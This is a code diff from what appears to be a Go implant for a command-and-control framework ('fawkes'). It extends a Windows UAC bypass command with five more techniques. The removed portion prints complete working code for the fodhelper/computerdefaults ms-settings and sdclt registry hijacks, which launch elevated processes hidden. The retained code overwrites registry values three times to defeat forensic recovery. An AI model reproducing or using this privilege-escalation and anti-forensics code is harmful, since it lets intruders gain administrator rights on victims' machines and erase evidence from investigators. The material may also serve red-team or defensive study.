@@ -6,11 +6,9 @@ package commands
 import (
 	crand "crypto/rand"
 	"encoding/json"
-	"fmt"
 	"os"
 	"path/filepath"
 	"strings"
-	"time"
 
 	"fawkes/pkg/structs"
 
@@ -30,7 +28,7 @@ func (c *UACBypassCommand) Description() string {
 }
 
 type uacBypassArgs struct {
-	Technique string `json:"technique"` // fodhelper, computerdefaults, sdclt
+	Technique string `json:"technique"` // fodhelper, computerdefaults, sdclt, eventvwr, silentcleanup, cmstp, dismhost, wusa
 	Command   string `json:"command"`   // command to run elevated (default: self)
 }
 
@@ -67,8 +65,18 @@ func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
 		return uacBypassMsSettings(args.Command, resolveSystem32Binary("computerdefaults.exe"), "computerdefaults")
 	case "sdclt":
 		return uacBypassSdclt(args.Command)
+	case "eventvwr":
+		return uacBypassEventvwr(args.Command)
+	case "silentcleanup":
+		return uacBypassSilentCleanup(args.Command)
+	case "cmstp":
+		return uacBypassCmstp(args.Command)
+	case "dismhost":
+		return uacBypassDismhost(args.Command)
+	case "wusa":
+		return uacBypassWusa(args.Command)
 	default:
-		return errorf("Unknown technique: %s. Use: fodhelper, computerdefaults, sdclt", args.Technique)
+		return errorf("Unknown technique: %s. Use: fodhelper, computerdefaults, sdclt, eventvwr, silentcleanup, cmstp, dismhost, wusa", args.Technique)
 	}
 }
 
@@ -96,148 +104,8 @@ func isElevated() bool {
 	return token.IsElevated()
 }
 
-// uacBypassMsSettings implements the ms-settings registry hijack used by both
-// fodhelper.exe and computerdefaults.exe. Both auto-elevate and read
-// HKCU\Software\Classes\ms-settings\Shell\Open\command for the handler.
-func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.CommandResult {
-	var output string
-	output += fmt.Sprintf("[*] UAC Bypass Technique: %s\n", techniqueName)
-	output += fmt.Sprintf("[*] Trigger binary: %s\n", triggerBinary)
-	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)
-
-	regKeyPath := `Software\Classes\ms-settings\Shell\Open\command`
-
-	// Step 1: Create the registry key and set command
-	output += "[*] Step 1: Setting registry key...\n"
-	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
-	if err != nil {
-		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
-	}
-
-	// Set (Default) value to our command
-	if err := key.SetStringValue("", command); err != nil {
-		key.Close()
-		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
-	}
-
-	// Set DelegateExecute to empty string — this is critical.
-	// Without it, Windows uses the normal ms-settings protocol handler.
-	// With an empty DelegateExecute, Windows falls back to the (Default) command value.
-	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
-		key.Close()
-		cleanupMsSettingsKey()
-		return errorResult(output + fmt.Sprintf("Error setting DelegateExecute: %v", err))
-	}
-	key.Close()
-	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)
-
-	// Step 2: Launch the auto-elevating trigger binary via ShellExecuteW.
-	// Auto-elevating binaries (fodhelper, computerdefaults) have the autoElevate
-	// manifest flag. ShellExecuteW triggers the elevation mechanism, while
-	// CreateProcessW (exec.Command) fails with ERROR_ELEVATION_REQUIRED on Win11.
-	output += "[*] Step 2: Launching trigger binary via ShellExecute...\n"
-	verbPtr, _ := windows.UTF16PtrFromString("open")
-	filePtr, _ := windows.UTF16PtrFromString(triggerBinary)
-	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
-	if err != nil {
-		cleanupMsSettingsKey()
-		return errorResult(output + fmt.Sprintf("Error launching %s: %v", triggerBinary, err))
-	}
-	output += fmt.Sprintf("[+] Launched %s via ShellExecute\n", triggerBinary)
-
-	// Step 3: Wait briefly then clean up registry
-	jitterSleep(1500*time.Millisecond, 3*time.Second)
-	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
-	cleanupMsSettingsKey()
-	output += "[+] Registry keys shredded and removed\n\n"
-
-	output += "[+] UAC bypass triggered successfully.\n"
-	output += "[*] If successful, a new elevated callback should appear shortly.\n"
-	output += "[*] The elevated process runs at high integrity (admin)."
-
-	return successResult(output)
-}
-
-// cleanupMsSettingsKey shreds values and removes the ms-settings hijack registry keys
-func cleanupMsSettingsKey() {
-	keyPath := `Software\Classes\ms-settings\Shell\Open\command`
-	shredRegistryKey(registry.CURRENT_USER, keyPath)
-	// Delete parent keys (deepest first)
-	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell\Open`)
-	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell`)
-	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
-}
-
-// uacBypassSdclt implements the sdclt.exe Folder handler hijack.
-// sdclt.exe auto-elevates and reads HKCU\Software\Classes\Folder\shell\open\command.
-func uacBypassSdclt(command string) structs.CommandResult {
-	sdcltPath := resolveSystem32Binary("sdclt.exe")
-
-	var output string
-	output += "[*] UAC Bypass Technique: sdclt\n"
-	output += fmt.Sprintf("[*] Trigger binary: %s\n", sdcltPath)
-	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)
-
-	regKeyPath := `Software\Classes\Folder\shell\open\command`
-
-	// Step 1: Create the registry key and set command
-	output += "[*] Step 1: Setting registry key...\n"
-	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
-	if err != nil {
-		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
-	}
-
-	// Set (Default) value to our command
-	if err := key.SetStringValue("", command); err != nil {
-		key.Close()
-		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
-	}
-
-	// DelegateExecute must be set (empty string) for the Folder handler too
-	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
-		key.Close()
-		cleanupSdcltKey()
-		return errorResult(output + fmt.Sprintf("Error setting DelegateExecute: %v", err))
-	}
-	key.Close()
-	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)
-
-	// Step 2: Launch sdclt.exe via ShellExecuteW (same reason as ms-settings: auto-elevate needs ShellExecute)
-	output += "[*] Step 2: Launching sdclt.exe via ShellExecute...\n"
-	verbPtr, _ := windows.UTF16PtrFromString("open")
-	filePtr, _ := windows.UTF16PtrFromString(sdcltPath)
-	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
-	if err != nil {
-		cleanupSdcltKey()
-		return errorResult(output + fmt.Sprintf("Error launching sdclt.exe: %v", err))
-	}
-	output += "[+] Launched sdclt.exe via ShellExecute\n"
-
-	// Step 3: Wait briefly then clean up registry
-	jitterSleep(1500*time.Millisecond, 3*time.Second)
-	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
-	cleanupSdcltKey()
-	output += "[+] Registry keys shredded and removed\n\n"
-
-	output += "[+] UAC bypass triggered successfully.\n"
-	output += "[*] If successful, a new elevated callback should appear shortly.\n"
-	output += "[*] The elevated process runs at high integrity (admin)."
-
-	return successResult(output)
-}
-
-// cleanupSdcltKey shreds values and removes the Folder handler hijack registry keys
-func cleanupSdcltKey() {
-	keyPath := `Software\Classes\Folder\shell\open\command`
-	shredRegistryKey(registry.CURRENT_USER, keyPath)
-	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell\open`)
-	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell`)
-	// Don't delete Software\Classes\Folder — it may have legitimate content
-}
-
 // shredRegistryValue overwrites a registry string value with random data 3 times
-// before deleting it. This defeats forensic recovery of deleted registry values
-// from hive slack space (RegRipper, Registry Explorer, Volatility).
+// before deleting it. Defeats forensic recovery from hive slack space.
 func shredRegistryValue(key registry.Key, valueName string) {
 	for i := 0; i < 3; i++ {
 		_ = key.SetStringValue(valueName, randomShredString())
@@ -246,12 +114,10 @@ func shredRegistryValue(key registry.Key, valueName string) {
 }
 
 // shredRegistryKey opens a registry key, shreds all its string values, then
-// deletes the key. Falls back to plain DeleteKey if the key can't be opened
-// for writing (e.g., insufficient permissions).
+// deletes the key.
 func shredRegistryKey(hive registry.Key, path string) {
 	key, err := registry.OpenKey(hive, path, registry.SET_VALUE|registry.QUERY_VALUE)
 	if err != nil {
-		// Can't open for writing — just try to delete
 		_ = registry.DeleteKey(hive, path)
 		return
 	}
